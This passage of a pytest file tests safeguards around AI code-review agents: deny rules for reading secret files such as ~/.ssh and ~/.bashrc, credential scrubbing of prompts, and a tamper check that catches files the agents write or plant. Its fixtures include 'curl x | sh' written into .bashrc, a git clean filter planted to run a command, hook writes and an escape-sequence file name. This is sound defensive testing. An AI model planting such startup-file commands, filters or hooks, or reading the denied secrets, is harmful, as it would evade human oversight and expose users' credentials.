        assert '--tools "$CLAUDE_TOOLS" --allowedTools "$tools"' in runner

    def test_the_scrubbers_secret_files_are_denied_too(self) -> None:
        # The scrubber would not send their contents; a reviewer could read them.
        for name in scrub_diff.SECRET_NAMES:
            assert f"//**/{name}" in SECRET_READS or any(
                rule.endswith(f"/{name}") for rule in SECRET_READS
            ), name
        for suffix in scrub_diff.SECRET_SUFFIXES:
            assert f"//**/*{suffix}" in SECRET_READS, suffix

    @pytest.mark.parametrize(
        "name", ["/home/a b", "/home/a(b)", "/home/a,b", "/home/*"]
    )
    def test_a_path_the_rule_syntax_reads_is_not_put_in_a_rule(self, name: str) -> None:
        # Only whitespace was checked; a comma, parenthesis or glob in the path changed
        # what the rule said.
        assert not claude_tools.rule_safe(name)
        assert claude_tools.rule_safe("/home/plain-name_1.x")

    def test_a_repository_under_a_denied_directory_stays_readable(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Denied ~/.docker/** whole, a repository kept under it could not be read by
        # its own reviewers.
        monkeypatch.setenv("HOME", str(tmp_path))
        repo = tmp_path / ".docker" / "src" / "project"
        repo.mkdir(parents=True)
        (tmp_path / ".docker" / "config.json").write_text("{}")
        denied = claude_tools.claude_disallowed("Read Grep Glob", repo)
        assert "Read(~/.docker/**)" not in denied
        assert f"Read(/{tmp_path / '.docker' / 'config.json'})" in denied
        assert not any(str(repo) in rule for rule in denied)
        # Elsewhere, the rule stands.
        assert "Read(~/.docker/**)" in claude_tools.claude_disallowed("Read", tmp_path)

    def test_shell_startup_and_history_files_are_denied(self) -> None:
        # It was measured reading ~/.bashrc, where API keys are exported.
        for path in ("~/.bashrc", "~/.zshrc", "~/.bash_history", "~/.pgpass"):
            assert path in SECRET_READS

    def test_the_accounts_own_home_is_covered_when_home_is_elsewhere(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # "~" in a rule is $HOME; with it pointed elsewhere, the account's real
        # ~/.ssh was readable.
        import pwd

        account = pwd.getpwuid(os.getuid()).pw_dir.rstrip("/")
        monkeypatch.setenv("HOME", str(tmp_path))
        reads = claude_tools._secret_reads()
        assert "~/.ssh/**" in reads
        assert f"/{account}/.ssh/**" in reads
        monkeypatch.setenv("HOME", account)
        assert claude_tools._secret_reads() == list(SECRET_READS)

    def test_a_home_with_a_space_is_left_to_the_tilde_rules(
        self,
        monkeypatch: pytest.MonkeyPatch,
        tmp_path: Path,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        # Space-separated, a rule with a space in it would have been two others.
        import pwd

        record = pwd.getpwuid(os.getuid())
        spaced = type(record)((*record[:5], "/home/a b", *record[6:]))
        monkeypatch.setattr(pwd, "getpwuid", lambda uid: spaced)
        monkeypatch.setenv("HOME", str(tmp_path))
        assert claude_tools._secret_reads() == list(SECRET_READS)
        out = capsys.readouterr()
        assert out.out == "" and "its name" in out.err


class TestScrubText:
    """``scrub_diff.py --text``: plain text, every line content, as full mode's
    context bundle is."""

    def _scrub(self, text: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [sys.executable, str(REPO_ROOT / "scripts" / "scrub_diff.py"), "--text"],
            input=text, capture_output=True, text=True, timeout=30,
        )  # fmt: skip

    def test_a_credential_in_plain_text_is_redacted(self) -> None:
        # Read as a diff, a line with no +, - or space prefix passed untouched, and the
        # bundle went into every prompt -- to Google too, with agy.
        key = "gh" + "p_" + "a" * 36
        done = self._scrub(f"plain\nsee {key}\ndiff --git a b\n")
        assert done.returncode == 1
        assert key not in done.stdout
        assert done.stdout.startswith("plain\n") and "diff --git a b\n" in done.stdout

    def test_a_private_keys_body_is_redacted(self) -> None:
        begin = "-----BEGIN RSA PRIVATE " + "KEY-----"
        end = "-----END RSA PRIVATE " + "KEY-----"
        done = self._scrub(f"a\n{begin}\nMIIbody\n{end}\nb\n")
        assert done.returncode == 1
        assert "MIIbody" not in done.stdout
        assert done.stdout.startswith("a\n") and done.stdout.endswith("b\n")

    def test_a_key_on_one_line_does_not_swallow_the_rest(self) -> None:
        # Escaped onto one line, BEGIN and END together opened a block that never
        # closed, and every later line of the bundle was redacted.
        begin = "-----BEGIN RSA PRIVATE " + "KEY-----"
        end = "-----END RSA PRIVATE " + "KEY-----"
        done = self._scrub(f'"key": "{begin}\\nMIIbody\\n{end}"\nafter\n')
        assert done.returncode == 1
        assert "MIIbody" not in done.stdout and done.stdout.endswith("after\n")

    def test_a_key_on_one_line_in_a_diff_does_not_swallow_the_hunk(self) -> None:
        begin = "-----BEGIN RSA PRIVATE " + "KEY-----"
        end = "-----END RSA PRIVATE " + "KEY-----"
        diff = (
            "diff --git a/c.json b/c.json\n@@ -0,0 +1,2 @@\n"
            f'+"key": "{begin}\\nMIIbody\\n{end}"\n+after\n'
        )
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT)], input=diff, capture_output=True,
            text=True, timeout=30,
        )  # fmt: skip
        assert "MIIbody" not in done.stdout and done.stdout.endswith("+after\n")

    def test_a_second_key_begun_on_an_end_line_is_redacted(self) -> None:
        # The END closed the block, and the next key's body passed: in a diff and as
        # text alike.
        begin = "-----BEGIN RSA PRIVATE " + "KEY-----"
        end = "-----END RSA PRIVATE " + "KEY-----"
        text = f"{begin}\nMIIfirst\n{end} {begin}\nMIIsecond\n{end}\nafter\n"
        done = self._scrub(text)
        assert "MIIsecond" not in done.stdout and done.stdout.endswith("after\n")
        diff = "diff --git a/k b/k\n@@ -0,0 +1,6 @@\n" + "".join(
            "+" + line + "\n" for line in text.splitlines()
        )
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT)], input=diff, capture_output=True,
            text=True, timeout=30,
        )  # fmt: skip
        assert "MIIsecond" not in done.stdout and done.stdout.endswith("+after\n")

    def test_a_quote_in_a_text_url_password_ends_nothing(self) -> None:
        # Scrubbed as source, its ' followed by ")" was taken for a string's end.
        url = "postgresql://alice:" + "K7a');s9" + "@db/prod"
        done = self._scrub(f"see {url} here\n")
        assert done.returncode == 1 and url not in done.stdout

    def test_clean_text_passes_through(self) -> None:
        done = self._scrub("nothing here\n")
        assert done.returncode == 0 and done.stdout == "nothing here\n"


class TestTamper:
    """The loop's check that the reviewers left the tree as they found it."""

    def test_a_new_file_under_an_ignored_path_is_reported(self, tmp_path: Path) -> None:
        # Hermes writes under --yolo; a file it put in .venv or .claude, both commonly
        # ignored, was invisible to the check.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        (tmp_path / ".gitignore").write_text(".claude/\n")
        before = tamper.snapshot(tmp_path)
        (tmp_path / ".claude").mkdir()
        (tmp_path / ".claude" / "settings.local.json").write_text("{}")
        touched = tamper.report(tmp_path, before)
        assert any(".claude" in line for line in touched)

    def test_a_new_file_in_an_existing_ignored_directory_is_reported(
        self, tmp_path: Path
    ) -> None:
        # Naming only the ignored directory, the status did not change when a file
        # was added to one that already existed.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        (tmp_path / ".gitignore").write_text(".venv/\ndata/\n")
        (tmp_path / ".venv").mkdir()
        (tmp_path / ".venv" / "old.py").write_text("")
        round_dir = tmp_path / "data" / "reviews" / "round-1"
        round_dir.mkdir(parents=True)
        before = tamper.snapshot(tmp_path, round_dir)
        (tmp_path / ".venv" / "sitecustomize.py").write_text("")
        # The round's own outputs are not a reviewer's.
        (round_dir / "raw-1.txt").write_text("")
        touched = tamper.report(tmp_path, before, round_dir)
        assert len(touched) == 1 and touched[0].startswith("!! .venv/sitecustomize.py ")

    def test_a_second_write_to_a_changed_file_is_reported(self, tmp_path: Path) -> None:
        # Its status line was "M a.py" before and after: a reviewer's edit to a file
        # already modified, or already untracked, was not seen.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        git = ["git", "-C", str(tmp_path), "-c", "user.email=a@b", "-c", "user.name=a"]
        (tmp_path / "a.py").write_text("x = 1\n")
        subprocess.run([*git, "add", "a.py"], check=True)
        subprocess.run([*git, "commit", "-q", "-m", "base"], check=True)
        (tmp_path / "a.py").write_text("x = 2\n")  # the author's own change
        (tmp_path / "new.py").write_text("y = 1\n")  # and an untracked file
        before = tamper.snapshot(tmp_path)
        (tmp_path / "a.py").write_text("x = 3\n")
        (tmp_path / "new.py").write_text("y = 2\n")
        touched = tamper.changed(before, tamper.snapshot(tmp_path))
        assert any(" a.py " in line for line in touched)
        assert any(" new.py " in line for line in touched)

    def test_a_write_to_a_git_hook_is_reported(self, tmp_path: Path) -> None:
        # Where a write becomes a command the loop's own git runs.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        before = tamper.snapshot(tmp_path)
        (tmp_path / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n")
        touched = tamper.changed(before, tamper.snapshot(tmp_path))
        assert any("pre-commit" in line for line in touched)

    def test_a_write_to_a_hooks_path_set_elsewhere_is_reported(
        self, tmp_path: Path
    ) -> None:
        # core.hooksPath put the hooks git runs outside .git, where the check did not look.
        from scripts.review_loop import tamper

        repo = tmp_path / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        hooks = tmp_path / "hooks"
        hooks.mkdir()
        subprocess.run(
            ["git", "-C", str(repo), "config", "core.hooksPath", str(hooks)], check=True
        )
        before = tamper.snapshot(repo)
        (hooks / "pre-commit").write_text("#!/bin/sh\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any("pre-commit" in line for line in touched)

    def test_a_worktree_config_change_is_reported(self, tmp_path: Path) -> None:
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        git = ["git", "-C", str(tmp_path)]
        worktree_config = "extensions.worktreeConfig"
        subprocess.run([*git, "config", worktree_config, "true"], check=True)
        before = tamper.snapshot(tmp_path)
        subprocess.run([*git, "config", "--worktree", "core.editor", "x"], check=True)
        touched = tamper.changed(before, tamper.snapshot(tmp_path))
        assert any("config.worktree" in line for line in touched)

    def test_a_write_to_a_home_startup_file_is_reported(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # hermes writes outside the repository too.
        from scripts.review_loop import merge_agent, tamper

        repo, home = tmp_path / "repo", tmp_path / "home"
        home.mkdir()
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        monkeypatch.setattr(merge_agent, "_homes", lambda: {home})
        before = tamper.snapshot(repo)
        (home / ".bashrc").write_text("curl x | sh\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any(".bashrc" in line for line in touched)

    def test_a_file_planted_in_the_round_directory_is_reported(
        self, tmp_path: Path
    ) -> None:
        # Excluded whole, the round directory was a place to plant a file unseen.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        round_dir = tmp_path / "data" / "round-1"
        round_dir.mkdir(parents=True)
        before = tamper.snapshot(tmp_path, round_dir)
        (round_dir / "raw-1.txt").write_text("")  # the round's own
        (round_dir / "evil.py").write_text("")
        (round_dir / "raw-7.txt").write_text("")  # no slot 7
        (round_dir / "stderr-2.txt").mkdir()  # a directory under an output's name
        touched = tamper.report(tmp_path, before, round_dir)
        assert any("evil.py" in line for line in touched)
        assert any("raw-7.txt" in line for line in touched)
        assert any("stderr-2.txt" in line for line in touched)
        assert not any("raw-1.txt" in line for line in touched)

    def test_a_write_through_a_link_to_a_startup_file_is_reported(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # The link looked the same; what it led to had changed.
        from scripts.review_loop import merge_agent, tamper

        repo, home = tmp_path / "repo", tmp_path / "home"
        home.mkdir()
        (tmp_path / "dotfiles").mkdir()
        (tmp_path / "dotfiles" / "bashrc").write_text("ok\n")
        (home / ".bashrc").symlink_to(tmp_path / "dotfiles" / "bashrc")
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        monkeypatch.setattr(merge_agent, "_homes", lambda: {home})
        before = tamper.snapshot(repo)
        (tmp_path / "dotfiles" / "bashrc").write_text("curl x | sh\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any(".bashrc" in line for line in touched)

    def test_an_unchanged_tree_reports_nothing(self, tmp_path: Path) -> None:
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        (tmp_path / "a.py").write_text("x\n")
        before = tamper.snapshot(tmp_path)
        assert tamper.changed(before, tamper.snapshot(tmp_path)) == []


def test_an_unresolvable_configured_directory_is_not_inside(tmp_path: Path) -> None:
    from scripts.preflight import coverage

    assert not coverage._inside("bad\x00dir")


class TestTamperHardening:
    """What a reviewer's write could hide from the tamper check, or run through it."""

    @staticmethod
    def _repo(path: Path) -> Path:
        subprocess.run(["git", "init", "-q", str(path)], check=True)
        (path / "a.txt").write_text("a\n")
        subprocess.run(["git", "-C", str(path), "add", "a.txt"], check=True)
        return path

    def test_an_edit_inside_an_already_dirty_embedded_repo_is_seen(
        self, tmp_path: Path
    ) -> None:
        # git lists a repository inside the tree as one entry, whatever changed in it.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        inner = repo / "vendor"
        subprocess.run(["git", "init", "-q", str(inner)], check=True)
        (inner / "x.py").write_text("one\n")
        before = tamper.snapshot(repo)
        (inner / "x.py").write_text("two, longer\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any(line.startswith("?? vendor/ ") for line in touched)

    def test_the_loops_own_log_in_the_tree_is_no_reviewers_write(
        self, tmp_path: Path
    ) -> None:
        # > data/reviews/run.log 2>&1: the log grows with each line the loop prints.
        repo = self._repo(tmp_path / "r")
        (repo / ".gitignore").write_text("data/\n")
        (repo / "data").mkdir()
        script = (
            "import sys; sys.path.insert(0, sys.argv[1])\n"
            "from pathlib import Path\n"
            "from scripts.review_loop import tamper\n"
            "repo = Path(sys.argv[2])\n"
            "before = tamper.snapshot(repo)\n"
            "print('x' * 4096, flush=True)\n"
            "(repo / 'data' / 'planted.py').write_text('')\n"
            "Path(sys.argv[3]).write_text(repr(tamper.changed(before, "
            "tamper.snapshot(repo))))\n"
        )
        result = tmp_path / "touched.txt"
        with (repo / "data" / "run.log").open("w") as log:
            subprocess.run(
                [sys.executable, "-c", script, str(REPO_ROOT), str(repo), str(result)],
                stdout=log, stderr=subprocess.STDOUT, check=True,
            )  # fmt: skip
        touched = result.read_text()
        assert "planted.py" in touched and "run.log" not in touched

    def test_a_filter_planted_in_git_config_is_not_run_by_the_check(
        self, tmp_path: Path
    ) -> None:
        # git status runs a clean filter on a file whose stat changed.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        before = tamper.snapshot(repo)
        marker = tmp_path / "ran"
        with (repo / ".git" / "config").open("a") as config:
            config.write(f'[filter "x"]\n\tclean = touch {marker}; cat\n')
        (repo / ".git" / "info").mkdir(exist_ok=True)
        (repo / ".git" / "info" / "attributes").write_text("* filter=x\n")
        (repo / "a.txt").write_text("b\n")
        touched = tamper.report(repo, before)
        assert not marker.exists()
        assert any("git status not run" in line for line in touched)

    def test_a_deleted_control_file_also_skips_git_status(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Deleting info/attributes changes what git runs as much as adding one does.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        (repo / ".git" / "info").mkdir(exist_ok=True)
        (repo / ".git" / "info" / "attributes").write_text("")
        before = tamper.snapshot(repo)
        (repo / ".git" / "info" / "attributes").unlink()

        def no_git(*_: object) -> list[str]:
            raise AssertionError("git status ran")

        monkeypatch.setattr(tamper, "_status_lines", no_git)
        touched = tamper.changed(before, tamper.snapshot(repo, None, before))
        assert any("git status not run" in line for line in touched)

    def test_a_named_log_file_is_no_reviewers_write(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # | tee data/reviews/run.log: another process writes it, so it is named.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        (repo / ".gitignore").write_text("data/\n")
        (repo / "data").mkdir()
        log = repo / "data" / "run.log"
        log.write_text("")
        monkeypatch.setattr(tamper, "LOG_FILES", {log})
        before = tamper.snapshot(repo)
        log.write_text("round 1 ...\n")
        assert tamper.changed(before, tamper.snapshot(repo)) == []

    def test_a_reviewers_file_name_cannot_rewrite_the_warning(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        before = tamper.snapshot(repo)
        (repo / "x\x1b[1A\x1b[2K\nok.py").write_text("")
        assert tamper.report(repo, before)
        listed = capsys.readouterr().out.split("Inspect before committing:\n")[1]
        assert "\x1b" not in listed and listed.count("\n") == 1

    def test_no_home_at_all_is_no_crash(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import pwd

        from scripts.review_loop.merge_agent import _homes

        monkeypatch.delenv("HOME", raising=False)

        def no_entry(uid: int) -> object:
            raise KeyError(uid)

        monkeypatch.setattr(pwd, "getpwuid", no_entry)
        assert _homes() == set()


class TestAuditScrub:
    """The audit is scrubbed by this checkout, whichever preflight wrote it."""

    def test_a_credential_quoted_in_the_audit_is_redacted(self, tmp_path: Path) -> None:
        # The project's own installed preflight may be too old to scrub its quotes,
        # and the audit goes into every prompt.
        from scripts.review_loop import diff

        key = "gh" + "p_" + "a" * 36
        audit = tmp_path / "audit.json"
        audit.write_text(
            json.dumps({"patterns": [{"line": f"t = '{key}'"}, {"line": "ok"}]})
        )
        diff._scrub_audit(audit, audit)
        scrubbed = json.loads(audit.read_text())
        assert key not in audit.read_text()
        assert scrubbed["patterns"][1]["line"] == "ok"

    def test_an_audit_that_cannot_be_scrubbed_is_not_used(self, tmp_path: Path) -> None:
        from scripts.review_loop import diff

        raw = tmp_path / "raw.json"
        raw.write_text("not json")
        with pytest.raises(RuntimeError, match="could not scrub the audit"):
            diff._scrub_audit(raw, tmp_path / "audit.json")
        # Nothing written for the prompts to read.
        assert not (tmp_path / "audit.json").exists()

    def test_a_quote_cut_by_an_older_preflight_is_read_whole(
        self, tmp_path: Path
    ) -> None:
        # Cut to 120 characters, a credential at the boundary was only partly there for
        # the scrub to see; the source line is read whole.
        from scripts.review_loop import diff

        key = "gh" + "p_" + "a" * 36
        source = "x = 1  # " + "." * 100 + f" t = '{key}'"
        (tmp_path / "a.py").write_text(source + "\n")
        raw = tmp_path / "raw.json"
        quote = {"file": "a.py", "line": 1, "text": source[:120]}
        raw.write_text(json.dumps({"suspicious_patterns": [quote]}))
        diff._requote_from_source(raw, tmp_path)
        hit = json.loads(raw.read_text())["suspicious_patterns"][0]
        assert hit["text"] == scrub_diff.REDACTED_TEXT

    def test_a_legacy_line_is_read_as_the_whole_line_it_is_part_of(
        self, tmp_path: Path
    ) -> None:
        # An older preflight numbered at "\r" too: its line 3 was the half after the CR,
        # the value without the name that makes it a credential.
        from scripts.review_loop import diff

        field = "pass" + "word"
        (tmp_path / "a.py").write_bytes(f'x = 1\n{field} = "a\rhunter2"\n'.encode())
        raw = tmp_path / "raw.json"
        quote = {"file": "a.py", "line": 3, "text": 'hunter2"'}
        raw.write_text(json.dumps({"suspicious_patterns": [quote]}))
        diff._requote_from_source(raw, tmp_path)
        hit = json.loads(raw.read_text())["suspicious_patterns"][0]
        assert hit["text"] == scrub_diff.REDACTED_TEXT

    def test_a_preflight_past_its_deadline_is_killed_whole(
        self, tmp_path: Path
    ) -> None:
        # Killing only the preflight left the test suite it started running on.
        from scripts.review_loop import diff

        marker = tmp_path / "child"
        cmd = ["sh", "-c", f"sleep 60 & echo $! > {marker}; sleep 60"]
        with pytest.raises(RuntimeError, match="did not finish"):
            diff._run_tree(cmd, tmp_path, 1)
        child = int(marker.read_text())
        time.sleep(0.3)
        stat = Path(f"/proc/{child}/stat")
        assert not stat.exists() or stat.read_text().split()[2] == "Z"

    def test_no_raw_audit_is_left_in_the_round(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # Scrubbed in place, a failed scrub left the raw audit in the round directory,
        # which is kept.
        from scripts.review_loop import diff

        def preflight(
            cmd: list[str], cwd: Path, timeout: float
        ) -> subprocess.CompletedProcess[str]:
            Path(cmd[cmd.index("--output") + 1]).write_text("not json")
            return subprocess.CompletedProcess(cmd, 1, "", "")

        monkeypatch.setattr(diff, "_run_tree", preflight)
        with pytest.raises(RuntimeError):
            diff.run_preflight(tmp_path, tmp_path)
        assert list(tmp_path.iterdir()) == []


class TestScrubJson:
    """``scrub_diff.py --json``, which the audit goes through."""

    def _scrub(self, doc: object) -> tuple[int, object]:
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT), "--json"],
            input=json.dumps(doc), capture_output=True, text=True, timeout=30,
        )  # fmt: skip
        return done.returncode, json.loads(done.stdout)

    def test_a_quoted_key_in_a_quoted_line_is_redacted(self) -> None:
        # The audit quotes a JSON file's line: the quote after the key's name let the
        # assignment through, in --json and in --text.
        line = '{"' + "pass" + 'word": "Zq7xK9mP2w4t"}'
        code, out = self._scrub({"suspicious_patterns": [{"text": line}]})
        assert code == 1
        assert out == {"suspicious_patterns": [{"text": scrub_diff.REDACTED_TEXT}]}
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT), "--text"],
            input=line + "\n", capture_output=True, text=True, timeout=30,
        )  # fmt: skip
        assert done.returncode == 1 and "Zq7x" not in done.stdout

    def test_a_value_is_read_with_its_key(self) -> None:
        # Values alone were scrubbed: "hunter2" says nothing; "password" beside it does.
        field = "pass" + "word"
        code, out = self._scrub({field: "hunter2", "user": "bob", "port": 5432})
        assert code == 1
        assert out == {field: scrub_diff.REDACTED_TEXT, "user": "bob", "port": 5432}

    @pytest.mark.parametrize("value", ['hun"ter2', "hun\nter2", "hun\\ter2"])
    def test_a_value_that_breaks_a_quoted_line_is_still_redacted(
        self, value: str
    ) -> None:
        # Put in a probe line, a quote or a newline in the value changed what the line
        # said, and the password passed.
        field = "pass" + "word"
        code, out = self._scrub({field: value, "port": 5432})
        assert code == 1 and out == {field: scrub_diff.REDACTED_TEXT, "port": 5432}

    def test_a_credential_fields_list_or_object_is_redacted(self) -> None:
        # Walked into, its leaves lost the key that said what they were.
        field = "pass" + "word"
        code, out = self._scrub(
            {field: ["hunter2"], "token": {"v": "hunter2"}, "tags": ["a", "b"]}
        )
        assert code == 1
        assert out == {
            field: scrub_diff.REDACTED_TEXT,
            "token": scrub_diff.REDACTED_TEXT,
            "tags": ["a", "b"],
        }

    def test_a_key_kept_as_a_list_of_lines_is_redacted(self) -> None:
        # Each line alone says nothing, and the body passed.
        begin = "-----BEGIN RSA PRIVATE " + "KEY-----"
        end = "-----END RSA PRIVATE " + "KEY-----"
        code, out = self._scrub({"k": [begin, "MIIbody1", "MIIbody2", end, "after"]})
        assert code == 1
        assert out == {"k": [scrub_diff.REDACTED_TEXT] * 4 + ["after"]}

    @pytest.mark.parametrize("field", ["access_token", "refresh_token", "id_token"])
    def test_oauth_token_fields_are_redacted(self, field: str) -> None:
        code, out = self._scrub({field: "abcd1234", "user": "bob"})
        assert code == 1 and out == {field: scrub_diff.REDACTED_TEXT, "user": "bob"}

    def test_a_key_shaped_like_a_credential_is_redacted(self) -> None:
        key = "gh" + "p_" + "a" * 36
        code, out = self._scrub({key: 1, "other": 2})
        assert code == 1 and key not in json.dumps(out) and out["other"] == 2

    def test_an_apostrophe_in_a_decoded_url_password_ends_nothing(self) -> None:
        # Read as source, its ' followed by a comma was taken for a string's end.
        url = "postgresql://alice:" + "p4ss',x" + "@db/prod"
        code, out = self._scrub({"dsn": url, "home": "http://host:8080/@scope/p"})
        assert code == 1
        home = "http://host:8080/@scope/p"
        assert out == {"dsn": scrub_diff.REDACTED_TEXT, "home": home}

    def test_a_credential_across_a_carriage_return_is_redacted(self) -> None:
        # splitlines() broke the string at the CR, between the name and its value.
        field = "pass" + "word"
        code, out = self._scrub({"notes": f'{field} = "x\rhunter2"'})
        assert code == 1 and out == {"notes": scrub_diff.REDACTED_TEXT}

    def test_a_digit_led_password_in_a_decoded_url_is_redacted(self) -> None:
        url = "postgres://u:" + "2024#Sec9" + "@db"
        code, out = self._scrub({"dsn": url})
        assert code == 1 and out == {"dsn": scrub_diff.REDACTED_TEXT}

    def test_a_redacted_key_does_not_overwrite_another(self) -> None:
        # Renamed to "<marker> <index>", it could equal a key already there, and one
        # of the two values was lost.
        key = "gh" + "p_" + "a" * 36
        taken = f"{scrub_diff.REDACTED_TEXT} 0"
        code, out = self._scrub({key: "x", taken: "kept"})
        assert code == 1 and isinstance(out, dict) and len(out) == 2
        assert out[taken] == "kept"

    def test_an_unknown_argument_is_an_error(self) -> None:
        # Taken for diff mode, an unprefixed line passed unscrubbed with exit 0.
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT), "--txt"],
            input="x\n", capture_output=True, text=True, timeout=30,
        )  # fmt: skip
        assert done.returncode == 2 and "unknown arguments" in done.stderr


class TestCodexMcpOff:
    """codex's MCP servers, each turned off by name: mcp_servers={} does not."""

    def _codex(self, monkeypatch: pytest.MonkeyPatch, stdout: str, rc: int = 0) -> None:
        from scripts.review_loop import backends

        monkeypatch.setattr(
            backends, "run",
            lambda *a, **k: subprocess.CompletedProcess([], rc, stdout, ""),
        )  # fmt: skip

    def test_each_server_is_turned_off_by_name(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Measured: under -c mcp_servers={}, a configured server stayed enabled.
        from scripts.review_loop import backends

        self._codex(monkeypatch, json.dumps([{"name": "fs"}, {"name": "git-hub_2"}]))
        assert backends.codex_mcp_off() == [
            "-c", "mcp_servers.fs.enabled=false",
            "-c", "mcp_servers.git-hub_2.enabled=false",
        ]  # fmt: skip

    @pytest.mark.parametrize(
        ("stdout", "rc"),
        [
            ("[]", 1),
            ("not json", 0),
            ('{"a": 1}', 0),
            ('[{"name": "a\\nb"}]', 0),
            ('[{"name": "a.b"}]', 0),
        ],
    )
    def test_not_knowing_the_servers_is_not_running_codex(
        self, monkeypatch: pytest.MonkeyPatch, stdout: str, rc: int
    ) -> None:
        from scripts.review_loop import backends

        self._codex(monkeypatch, stdout, rc)
        assert backends.codex_mcp_off() is None

    def test_a_codex_whose_servers_are_unknown_falls_through(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.review_loop import reviewers

        monkeypatch.setattr(reviewers, "codex_mcp_off", lambda cwd: None)
        found = {"hermes": False, "claude": True, "codex": True, "gemini": False,
                 "agy": False}  # fmt: skip
        round_ = reviewers._Round(
            "d", "{}", "", tmp_path, found, False, tmp_path, out_dir=tmp_path
        )
        picked = reviewers._pick_backend(2, round_)
        assert picked is not None and picked.backend == "claude"
        monkeypatch.setattr(reviewers, "codex_mcp_off", lambda cwd: ["-c", "x"])
        picked = reviewers._pick_backend(2, round_)
        assert picked is not None and picked.cmd[:4] == ["codex", "exec", "-c", "x"]


class TestCoverageDirs:
    """The coverage gate's directories, from review-config.json."""

    @pytest.mark.parametrize("path", ["/", "///", "/etc", "../elsewhere"])
    def test_a_directory_outside_the_repository_is_not_used(self, path: str) -> None:
        # "/" stripped of its slash was the repository root itself, and passed.
        from scripts.preflight import coverage

        assert not coverage._inside(path)

    def test_a_dropped_test_directory_is_said(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.preflight import coverage

        (tmp_path / "tests").mkdir()
        (tmp_path / "src").mkdir()
        monkeypatch.setattr(coverage, "REPO_ROOT", tmp_path)
        monkeypatch.setattr(coverage, "TEST_DIRS", ["tests/", "/", "missing/"])
        monkeypatch.setattr(coverage, "SOURCE_DIRS", ["src/"])
        monkeypatch.setattr(coverage, "is_safe_relpath", lambda p: ".." not in p)
        assert coverage._test_dirs() == ["tests/"]
        warnings: list[str] = []
        monkeypatch.delenv("PYTEST_CURRENT_TEST", raising=False)
        monkeypatch.setattr(
            coverage.subprocess, "run",
            lambda *a, **k: subprocess.CompletedProcess([], 0, "", ""),
        )  # fmt: skip
        coverage._run_pytest_with_coverage(warnings)
        assert any("test_dirs ignored" in w and "missing/" in w for w in warnings)


class TestCarriageReturn:
    """A lone carriage return in a changed line."""

    def test_a_credential_after_a_lone_cr_is_redacted(self, tmp_path: Path) -> None:
        # Read as text, git's output had the CR turned into a line break, and what
        # followed reached the scrubber with no + -- metadata to it -- and went out.
        from scripts.review_loop import diff

        repo = tmp_path / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        git = ["git", "-C", str(repo), "-c", "user.email=a@b", "-c", "user.name=a"]
        (repo / "a.py").write_text("x = 1\n")
        subprocess.run([*git, "add", "a.py"], check=True)
        subprocess.run([*git, "commit", "-q", "-m", "base"], check=True)
        key = "gh" + "p_" + "a" * 36
        (repo / "a.py").write_bytes(b"x = 1\ny = 2\r" + key.encode() + b"\n")
        round_dir = tmp_path / "round"
        round_dir.mkdir()
        base = subprocess.run(
            [*git, "rev-parse", "HEAD"], capture_output=True, text=True, check=True
        ).stdout.strip()
        with pytest.raises(diff.SecretsDetectedError):
            diff.collect_diff(round_dir, repo, base)
        assert key not in (round_dir / "diff.patch").read_text(errors="replace")


class TestPlainDiff:
    """The diff the scrubber reads is plain, whatever git's config says."""

    def test_a_colour_diff_is_still_scrubbed(self) -> None:
        # color.diff=always put an escape before every "+": no line was content, and
        # the scrubber passed them all with exit 0.
        key = "gh" + "p_" + "a" * 36
        diff = (
            "\x1b[1mdiff --git a/a.py b/a.py\x1b[m\n\x1b[36m@@ -1 +1,2 @@\x1b[m\n"
            f"\x1b[32m+t = '{key}'\x1b[m\n"
        )
        done = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT)], input=diff, capture_output=True,
            text=True, timeout=30,
        )  # fmt: skip
